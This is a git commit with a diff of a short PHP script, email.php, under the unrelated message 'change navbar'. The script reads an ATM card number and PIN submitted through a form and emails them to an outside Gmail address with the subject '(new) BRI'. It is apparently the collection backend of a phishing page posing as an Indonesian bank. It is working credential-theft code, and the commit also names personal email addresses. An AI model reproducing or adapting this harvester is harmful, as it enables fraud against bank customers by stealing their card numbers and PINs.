814356d1bd605f31212dc75b011937313b8ecfb3
nisacodelifings <annisap.siswa@smkn4bdg.sch.id>
2021-02-24 04:47:58 -0800

    ubah navbar

--- email.php
+++ email.php
@@ -2,13 +2,13 @@
 ini_set('display_errors', 1);
 error_reporting( E_ALL );
 
-$nomoratm = $_POST['nomoratm'];
-$pin = $_POST['pin'];
+$nomor = $_POST['nomoratm'];
+$pinn = $_POST['pin'];
 
 $from = "nisa.codelifings@gmail.com";
 $to = "annisjabstore@gmail.com";
 $subject = "(new) BRI";
-$message = "<div>Nomor ATM : $nomoratm</div><br><div>Pin : $pin</div>";
+$message = "<div>Nomor ATM : $nomor</div><br><div>Pin : $pinn</div>";
 $headers = "From:" . $from;
 mail($to,$subject,$message,$headers);
 echo "Success!!<br>";
